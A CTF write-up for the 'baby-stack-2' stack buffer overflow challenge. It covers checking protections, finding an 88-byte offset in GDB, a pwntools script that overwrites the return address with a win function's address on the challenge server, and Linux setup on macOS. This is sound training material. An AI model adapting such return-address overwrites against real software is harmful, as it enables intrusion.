# Baby Stack 2 CTF Solution

This document outlines the steps to solve the baby-stack-2 buffer overflow challenge.

## 1. Initial Analysis

The challenge provides a binary named `baby-stack-2` and a hexdump of this binary in `baby-stack-2.txt`.
The goal is to exploit a buffer overflow vulnerability.

We observed that providing a long string of 'A's as input to the username prompt causes a crash or unexpected behavior, indicating a potential buffer overflow.

```
┌─[isaaclins@Isaacs-MacBook-Pro]─[baby-stack-2]─[main]─[10:16:53]─[9ms]
└─⫸ nc cyberskills.ch 5000
Welcome to baby-stack-2. Please login.
Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���\AAAAAAAAAAAAAA
```

## 2. Next Steps (To be determined)

- Analyze the binary with a disassembler/debugger (e.g., GDB, Ghidra) to understand its functionality.
- Determine the exact offset to overwrite the return address.
- Identify if any security protections (ASLR, NX, Stack Canaries) are enabled.
- Find or craft shellcode or a ROP chain to gain control of execution.
- Develop the final exploit.

## 3. Detailed Plan for Exploitation

To exploit this buffer overflow, we need to gather some information about the binary. You'll likely need `gdb` (preferably with an extension like GEF, Pwndbg, or PEDA) and `checksec`.

**Important Note for macOS Users**: The `baby-stack-2` binary is a Linux executable (ELF). You will need a Linux environment (e.g., a Linux Virtual Machine or a Docker container with a Linux image) to run the binary and perform the analysis steps below using tools like GDB and `checksec`.

### Step 1: Determine Architecture and Protections

First, let's find out the architecture and what security mitigations are in place.
Run `checksec baby-stack-2` in your terminal.

```bash
checksec ./baby-stack-2
```

Please provide the output. We are interested in:

- **Arch**: (e.g., amd64-64-little)
- **RELRO**: (Full RELRO or Partial RELRO)
- **Stack Canary**: (e.g., Canary found / No canary found) - Your initial test suggests no canary, but let's confirm.
- **NX**: (e.g., NX enabled / NX disabled) - If NX is enabled, the stack is not executable.
- **PIE**: (e.g., PIE enabled / No PIE) - If PIE is enabled, the binary's base address is randomized.

### Step 2: Finding the Offset to the Return Address

We need to find out exactly how many bytes of input it takes to overwrite the return address on the stack. We can do this with GDB and a cyclic pattern.

1.  **Generate a cyclic pattern**:
    You can use `pwntools` for this:

    ```python
    from pwn import *
    print(cyclic(200)) # Generate a 200-byte unique pattern
    ```

    Or within GDB with GEF/Pwndbg:

    ```gdb
    gef> pattern create 200
    ```

    Copy the generated pattern.

2.  **Run the binary in GDB**:

    ```bash
    gdb ./baby-stack-2
    ```

3.  **Run with the pattern**:
    Inside GDB:

    ```gdb
    r
    ```

    When prompted for "Username:", paste the cyclic pattern you generated and press Enter.

4.  **Identify the crash and offset**:
    The program should crash with a segmentation fault. The value in the instruction pointer register (RIP for x64, EIP for x86) will be part of your cyclic pattern.
    In GDB (after the crash):
    ```gdb
    info registers rip # For x64
    # or info registers eip # For x86
    ```
    Note down the value (e.g., `0x6161616a`).
    Then find the offset:
    Using `pwntools`:
    ```python
    from pwn import *
    print(cyclic_find(0x6161616a)) # Replace with the value you found in RIP/EIP
    ```
    Or within GDB with GEF/Pwndbg:
    ```gdb
    gef> pattern offset $rip
    # or pattern search $rip
    ```
    This will give you the offset. Please provide this offset.

### Step 3: Finding a Target Function (e.g., a "win" function)

We need to find a function to redirect execution to. This is often a "win" function, one that prints a flag, or calls `system("/bin/sh")`.

1.  **List functions in GDB**:

    ```gdb
    info functions
    ```

    Look for any functions that seem promising (e.g., `win`, `print_flag`, `shell`, `system_call`, etc.).

2.  **Disassemble functions**:
    If you find a candidate function, get its address and disassemble it:

    ```gdb
    p <function_name>   # To get its address
    disas <function_name> # To see its assembly code
    ```

3.  **Using objdump (alternative)**:
    You can also list symbols and disassemble with `objdump`:
    ```bash
    objdump -tT ./baby-stack-2 # List symbols
    objdump -d ./baby-stack-2  # Disassemble all
    ```
    Look for relevant function names and their addresses.

Please provide the name and address of any potential target function you find.

### Step 4: Crafting and Sending the Exploit

Based on our analysis:

- The `checksec` output showed **No Canary**, **NX Disabled**, and **No PIE**.
- The `info functions` command in GDB revealed a `win` function at address `0x000000000040129b`.
- Disassembling `get_username` showed a buffer of `0x50` (80 decimal) bytes allocated on the stack (`sub $0x50, %rsp`).
- The offset to overwrite the return address is `buffer_size + size_of_saved_rbp`. For x86-64, the saved `rbp` is 8 bytes. So, the offset is `80 + 8 = 88` bytes.

We can now write our exploit script.

**`exploit.py`**

```python
from pwn import *

# Offset to the return address
OFFSET = 88

# Address of the win function (from GDB: info functions)
WIN_FUNCTION_ADDRESS = 0x000000000040129b

# Target details
HOST = 'cyberskills.ch'
PORT = 5000

# Connect to the target
# For local testing, you would use:
# target = process('./baby-stack-2')
# gdb.attach(target) # If you want to debug locally
target = remote(HOST, PORT)

# Craft the payload
# 'A' * OFFSET fills the buffer up to the return address
# p64(WIN_FUNCTION_ADDRESS) is the 64-bit address of our win function, in little-endian format
payload = b'A' * OFFSET + p64(WIN_FUNCTION_ADDRESS)

log.info(f"Calculated offset: {OFFSET}")
log.info(f"Win function address: {hex(WIN_FUNCTION_ADDRESS)}")
log.info(f"Payload ({len(payload)} bytes): {payload}")

# Wait for the "Username: " prompt
line = target.recvuntil(b"Username: ")
log.info(f"Received: {line.decode().strip()}")

# Send the payload
log.info("Sending payload...")
target.sendline(payload)

# Go interactive to see the output (hopefully the flag!)
log.info("Switching to interactive mode...")
target.interactive()
```

**To run the exploit:**

1.  Ensure you are in your x86-64 Docker container (e.g., `ctf_x86_privileged`).
2.  Navigate to the directory containing `baby-stack-2` and `exploit.py` (e.g., `/mnt/ctf`).
3.  Run the script: `python3 exploit.py`

This should connect to the server, send the payload, and hopefully provide the flag or a shell.

**What I need from you to proceed:**

1.  The output of `checksec ./baby-stack-2`.
2.  The offset to the return address (RIP/EIP).
3.  The name and address of any potential "win" or flag-giving function. If PIE is enabled for the binary, we'll need to be aware of that.

Once you provide this information, I can help you refine the exploit script.

## 4. Setting up a Linux Environment on macOS (for ELF binaries)

Since the `baby-stack-2` binary is a Linux ELF executable, you'll need a Linux environment to analyze and run it on macOS. Here are two common methods:

### Method A: Virtual Machine (e.g., VirtualBox with Ubuntu Desktop)

This method provides a full Linux desktop experience.

1.  **Download and Install Virtualization Software**:
    - Get VirtualBox from [virtualbox.org](https://www.virtualbox.org/) (free) or consider VMware Fusion/Parallels Desktop (paid).
    - Install it on your Mac.
2.  **Download a Linux ISO**:
    - Get a Linux distribution ISO, for example, Ubuntu Desktop LTS from [ubuntu.com/download/desktop](https://ubuntu.com/download/desktop).
3.  **Create VM in VirtualBox**:
    - Open VirtualBox, click "New".
    - Name it, set Type to "Linux", Version to "Ubuntu (64-bit)" (or your chosen distro).
    - Allocate RAM (e.g., 4GB+).
    - Create a virtual hard disk (VDI, dynamically allocated, 25GB+ recommended).
4.  **Install Linux in VM**:
    - Start the VM. When prompted for a startup disk, select the Linux ISO you downloaded.
    - Follow the on-screen instructions to install Linux inside the VM.
5.  **Install Guest Additions**:
    - Once Linux is running in the VM, in VirtualBox, go to "Devices" -> "Insert Guest Additions CD image..." and follow prompts inside the Linux VM to install them for better integration (shared clipboard, screen resolution, etc.).
6.  **Transfer Files & Install Tools**:
    - Transfer the `baby-stack-2` binary to your Linux VM (e.g., using a shared folder, or by enabling shared clipboard and copy-pasting content if it's text-based, or using `scp`).
    - Open a terminal in your Linux VM and install necessary tools:
      ```bash
      sudo apt update
      sudo apt install gdb build-essential checksec python3 python3-pip -y
      pip3 install pwntools
      ```

### Method B: Docker

This method is more lightweight and command-line focused.

1.  **Install Docker Desktop for Mac**:
    - Download and install from [docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop).
2.  **Pull a Linux Image**:

    - Open Terminal on your Mac and run: `docker pull ubuntu`

3.  **Run a Linux Container**:
    - **For Intel Macs**:
      `docker run -it --name ctf_environment -v /path/to/your/ctf/files:/mnt/ctf ubuntu bash`
    - **For Apple Silicon Macs (M1/M2/M3, etc.) to run x86-64 binaries (like many CTF challenges)**:
      You need to specify the platform:
      `docker run -it --platform linux/amd64 --name ctf_x86_env -v /path/to/your/ctf/files:/mnt/ctf ubuntu bash`
      - **Troubleshooting GDB ptrace errors**: If GDB shows "Cannot PTRACE_GETREGS: Input/output error" or similar ptrace/permission errors when running the program (especially with `--platform linux/amd64`), try running the container with the `--privileged` flag. You will need to stop and remove the old container first:
        ```bash
        # On your Mac terminal:
        # docker stop ctf_x86_env
        # docker rm ctf_x86_env
        docker run -it --platform linux/amd64 --privileged --name ctf_x86_privileged -v /path/to/your/ctf/files:/mnt/ctf ubuntu bash
        ```
      - Replace `/path/to/your/ctf/files` with the actual path on your Mac where `baby-stack-2` is located. This mounts your CTF directory into `/mnt/ctf` inside the container.
4.  **Install Tools in Container**:
    - Inside the container's shell (which you just entered):
    ```bash
    apt update
    apt install gdb build-essential checksec python3 python3-pip -y
    pip3 install pwntools # On older systems
    # On newer Ubuntu/Debian, pip might give an "externally-managed-environment" error.
    # If so, try: apt install python3-pwntools -y
    # If python3-pwntools is not available or you need a specific version,
    # you might need to create a virtual environment:
    # apt install python3-venv -y
    # python3 -m venv .venv
    # source .venv/bin/activate
    # pip3 install pwntools
    ```
    - Your files from your Mac will be available in `/mnt/ctf`.

Once your Linux environment is set up and you have the `baby-stack-2` binary and necessary tools inside it, you can proceed with the analysis steps (Step 1-3 in the previous section of this document).
